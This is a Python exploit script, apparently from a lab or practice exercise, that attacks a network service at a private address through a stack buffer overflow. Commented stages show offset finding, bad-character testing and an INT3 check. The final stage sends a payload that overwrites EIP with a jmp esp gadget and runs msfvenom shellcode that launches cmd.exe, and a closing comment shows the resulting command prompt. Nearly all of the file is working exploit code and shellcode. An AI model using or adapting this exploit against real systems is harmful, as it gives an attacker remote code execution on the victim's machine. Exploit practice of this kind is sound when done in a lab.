import socket

RHOST = "10.211.55.6"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# STAGE 0: cyclic pattern search
buffer_size = 146

# STAGE 0.5: gadget search (should not include bad chars, obviously)
# !mona j -r esp
jmp_esp = "\xbf\x16\x04\x08"

# STAGE 1: badchar detection
# null-terminator and \n by default
#
# badchars = [0x00, 0x0a]
# badchar_test = "".join(map(lambda i: chr(i) if i not in badchars else "", range(0x00, 0x100)))
# 
# with open("badchar_test.bin", "wb") as f:
#     f.write(badchar_test)
# 
# payload = "A" * buffer_size # offset buffer
# payload += jmp_esp # EIP/RIP overwrite
# payload += badchar_test # push badchars to stack
# payload += "\n"
#
# s.send(payload)
#
# !mona cmp -a esp -f \\Mac\Home\Downloads\badchar_test.bin
# !!! Hooray, normal shellcode unmodified !!!

# STAGE 2: sigtrap EIP
# payload = "A" * buffer_size
# payload += jmp_esp
# payload += "\xcc"
# payload += "\n"
# 
# s.send(payload)
#
# [13:23:25] INT3 command at 01511A0C

# STAGE 3: exploitation
# msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode CMD=cmd.exe EXITFUNC=thread
shellcode =  ""
shellcode += "\xda\xdd\xd9\x74\x24\xf4\xba\xb9\x95\x33\x5d"
shellcode += "\x5e\x29\xc9\xb1\x31\x83\xc6\x04\x31\x56\x13"
shellcode += "\x03\xef\x86\xd1\xa8\xf3\x41\x97\x53\x0b\x92"
shellcode += "\xf8\xda\xee\xa3\x38\xb8\x7b\x93\x88\xca\x29"
shellcode += "\x18\x62\x9e\xd9\xab\x06\x37\xee\x1c\xac\x61"
shellcode += "\xc1\x9d\x9d\x52\x40\x1e\xdc\x86\xa2\x1f\x2f"
shellcode += "\xdb\xa3\x58\x52\x16\xf1\x31\x18\x85\xe5\x36"
shellcode += "\x54\x16\x8e\x05\x78\x1e\x73\xdd\x7b\x0f\x22"
shellcode += "\x55\x22\x8f\xc5\xba\x5e\x86\xdd\xdf\x5b\x50"
shellcode += "\x56\x2b\x17\x63\xbe\x65\xd8\xc8\xff\x49\x2b"
shellcode += "\x10\x38\x6d\xd4\x67\x30\x8d\x69\x70\x87\xef"
shellcode += "\xb5\xf5\x13\x57\x3d\xad\xff\x69\x92\x28\x74"
shellcode += "\x65\x5f\x3e\xd2\x6a\x5e\x93\x69\x96\xeb\x12"
shellcode += "\xbd\x1e\xaf\x30\x19\x7a\x6b\x58\x38\x26\xda"
shellcode += "\x65\x5a\x89\x83\xc3\x11\x24\xd7\x79\x78\x23"
shellcode += "\x26\x0f\x07\x01\x28\x0f\x07\x36\x41\x3e\x8c"
shellcode += "\xd9\x16\xbf\x47\x9e\xf9\x5d\x4d\xeb\x91\xfb"
shellcode += "\x04\x56\xfc\xfb\xf3\x95\xf9\x7f\xf1\x65\xfe"
shellcode += "\x60\x70\x63\xba\x26\x69\x19\xd3\xc2\x8d\x8e"
shellcode += "\xd4\xc6\xee\x5d\x4f\xc7\x95\xe5\xea\x17"

# shikata_ga_nai blows a hole in ESP while decoding the payload. we can either stuff a lot of NOPs until it works or move it's aim (ESP) a bit lower, like this:
# metasm > sub esp,0x10
sub_esp_10 = "\x83\xec\x10"

payload = "\x90" * buffer_size
payload += jmp_esp
payload += sub_esp_10
payload += shellcode
payload += "\n"

s.send(payload)

# C:\Windows>
